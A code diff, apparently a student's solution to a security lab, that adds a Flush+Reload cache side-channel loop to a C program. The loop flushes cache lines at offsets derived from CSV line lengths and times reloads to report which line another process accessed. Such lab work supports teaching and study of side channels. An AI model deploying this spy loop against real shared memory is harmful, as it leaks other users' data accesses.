@@ -107,6 +107,35 @@ int main(int argc, char* argv[])
        4. Monitor the same cache set N times before monitoring the
           next set. (Clue: N~10 should work)
     */
+   int csv_offsets[] = {126, 88, 98, 101, 89, 100, 93, 84, 98, 88, 110, 91, 101, 92, 91, 90, 88, 98, 87, 94, 88, 96, 95, 97, 90, 92, 97, 88, 101, 96, 90, 90, 89, 93, 92, 99, 95, 89, 82, 95, 95, 88, 96, 96, 95, 102, 95, 99, 96, 95, 89, 103, 90, 97, 102, 88, 87, 89, 90, 90, 97, 88, 86, 96, 92, 91, 105, 89, 95, 101, 97, 96, 100, 93, 91, 88, 85, 90, 101, 107, 91, 90, 91, 111, 100};
+	int prime = 919;
+	int index = 0;
+	int i = 0;
+	int lines = 85;
+	int offset = 0;
+	int hitThreshold = hit_time + 20;
+	printf("hitThreshold: %d\n", hitThreshold);
+	while (1) {
+		// Not sure what offset is at this point
+		// (index*prime + offset)%(maxrange)
+		index = (i * prime + 1)%lines;
+		offset = 0;
+		for (int j = 0; j < index; j++) {
+			offset += csv_offsets[j];
+		}
+		//printf("Checking Index %d\n", index);
+		for (int k = 0; k < 10; ++k) {
+			flush(addr + offset);
+			sched_yield();
+			time = measure_one_block_access_time(addr + offset);
+			if (time < (uint64_t)hitThreshold) {
+				a[index] = 1;
+				printf("Index %d was accessed.\n", index);
+				//printf("Time to access: %lu\n", time);
+			}
+		}
+		i++;
+	}
        
     return 0;    
 }
